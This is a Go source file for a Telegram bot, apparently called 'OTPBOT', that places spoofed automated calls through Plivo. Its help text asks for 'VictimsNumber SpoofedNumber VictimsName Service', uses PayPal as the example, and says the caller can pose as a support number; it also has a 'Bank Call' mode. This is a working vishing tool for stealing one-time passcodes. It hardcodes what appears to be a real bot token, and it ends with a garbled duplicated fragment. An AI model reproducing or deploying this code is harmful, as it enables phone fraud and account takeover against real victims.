package main

import (
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/plivo/plivo-go"
	tb "gopkg.in/tucnak/telebot.v2"
)

// Configuration
var NGROK_URL string = "https://2762-73-64-246-112.ngrok-free.app"
var BOT_TOKEN string = "6314542780:AAFUyxedZQ5KGGGF1Ayj-_SQpOxoPcL5Bv0"
var PLIVO_AUTH_ID string = ""
var PLIVO_AUTH_TOKEN string = ""
var OWNER_CHAT_ID int64 = 6045480594

// CallMode represents the available call modes
type CallMode struct {
	Name string
}

// CallModes stores the available call modes
var CallModes = []CallMode{
	{Name: "Bank Call"},
	{Name: "Start Call"},
}

func main() {
	client, err := plivo.NewClient(PLIVO_AUTH_ID, PLIVO_AUTH_TOKEN, &plivo.ClientOptions{})
	if err != nil {
		log.Fatal(err)
	}

	b, err := tb.NewBot(tb.Settings{
		Token: BOT_TOKEN,
		Poller: &tb.LongPoller{Timeout: 10 * time.Second},
	})
	if err != nil {
		log.Fatal(err)
	}

	inlineKeys := [][]tb.InlineButton{}
	for _, mode := range CallModes {
		inlineKeys = append(inlineKeys, []tb.InlineButton{tb.InlineButton{
			Unique: "call_" + strings.ToLower(mode.Name),
			Text:   mode.Name,
		}})
	}

	b.Handle("/start", func(m *tb.Message) {
		if m.Chat.ID != OWNER_CHAT_ID {
			return
		}

		b.Send(m.Sender, "Hello World! The Bot Created By https://t.me/+udUELGMgaBU3ODU5 https://OpenSourced.Pro in Pure Go Lang [https://go.dev/] :)\n To Know My Basic Usage Click /howtouse and The Call Modes /callmodes\n\nhttps://OpenSourced.Pro")
	})

	b.Handle("/callmodes", func(m *tb.Message) {
		if !m.Private() {
			return
		}

		menu := &tb.ReplyMarkup{InlineKeyboard: inlineKeys}
		b.Send(m.Sender, "<b>List Of Call Modes:</b>", tb.ModeHTML, menu)
	})

	b.Handle("/howtouse", func(m *tb.Message) {
		if !m.Private() {
			return
		}
		b.Send(m.Sender, "<b>Follow These Arguments:</b>\n/startcall VictimsNumber SpoofedNumber VictimsName Service\n\nExample: /startcall 14693017322 18443734961 Joe PayPal\nSpoofed Number allows you to spoof as any number (Spoof as a support number)</b>\n\nhttps://OpenSourced.Pro", tb.ModeHTML)
	})

	b.Callback(func(c *tb.Callback) {
		data := strings.Split(c.Data, "_")
		if len(data) != 2 {
			return
		}

		mode := strings.ToLower(data[1])
		switch mode {
		case "bank call":
			handleBankCall(c, b, client)
		case "start call":
			handleStartCall(c, b, client)
		}
	})

	fmt.Println("OTPBOT: Bot Online\n\n@OpenSourced.Pro")
	b.Start()
}

func handleBankCall(c *tb.Callback, b*tb.Bot, client *plivo.Client) {
	data := strings.Split(c.Message.Text, " ")
	if len(data) < 3 {
		b.Send(c.Sender, "<b>Follow These Arguments\n/startcall VictimsNumber SpoofedNumber VictimsName Service\n\nExample: /startcall 14693017322 18443734961 Amy PayPal</b>\n\n@OpenSourced.Pro", tb.ModeHTML)
		return
	}
	fmt.Println("[LOGS] [NEW BANK CALL] From: " + data[2] + " To: " + data[1] + " Module: " + data[4])
	b.Send(c.Sender, "<b>📱 Bank Call Initiated</b>", tb.ModeHTML)

	mes, _ := b.Send(c.Sender, "🤳 Bank Call Started\n\n@OpenSourced.Pro")

	_, err := client.Calls.Create(
		plivo.CallCreateParams{
			From:         data[2],
			To:           data[1],
			AnswerURL:    fmt.Sprintf("%v/generate_bank_xml/%v/%v/%v/%v", NGROK_URL, c.Chat.ID, data[3], data[4], mes.ID),
			AnswerMethod: "GET",
			TimeLimit:    60,
			HangupURL:    fmt.Sprintf("%v/hangup_bank/%v/%v", NGROK_URL, c.Chat.ID, mes.ID),
			RingURL:      fmt.Sprintf("%v/ring_bank/%v/%v", NGROK_URL, c.Chat.ID, mes.ID),
		},
	)

	if err != nil {
		panic(err)
	}
}

func handleStartCall(c *tb.Callback, b*tb.Bot, client *plivo.Client) {
	data := strings.Split(c.Message.Text, " ")
	if len(data) < 3 {
		b.Send(c.Sender, "<b>Follow These Arguments\n/startcall VictimsNumber SpoofedNumber VictimsName Service\n\nExample: /startcall 14693017322 18443734961 Joe PayPal</b>\n\n@OpenSourced.Pro", tb.ModeHTML)
		return
	}
	fmt.Println("[LOGS] [NEW START CALL] From: " + data[2] + " To: " + data[1] + " Module: " + data[4])
	b.Send(c.Sender, "<b>📱 Start Call Initiated</b>", tb.ModeHTML)

	mes, _ := b.Send(c.Sender, "🤳 Start Call Started\n\n@OpenSourced.Pro")

	_, err := client.Calls.Create(
		plivo.CallCreateParams{
			From:         data[2],
			To:           data[1],
			AnswerURL:    fmt.Sprintf("%v/generate_xml/%v/%v/%v/%v", NGROK_URL, c.Chat.ID, data[3], data[4], mes.ID),
			AnswerMethod: "GET",
			TimeLimit:    60,
			HangupURL:    fmt.Sprintf("%v/hangup/%v/%v", NGROK_URL, c.Chat.ID, mes.ID),
			RingURL:      fmt.Sprintf("%v/ring/%v/%v", NGROK_URL, c.Chat.ID, mes.ID),
		},
	)

	if err != nil {
		panic(err)
	}
}

	fmt.Println("OTPBOT: Bot Online\n\n@OpenSourced.Pro")
	b.Start()// starting the bot
}
//Work Completed!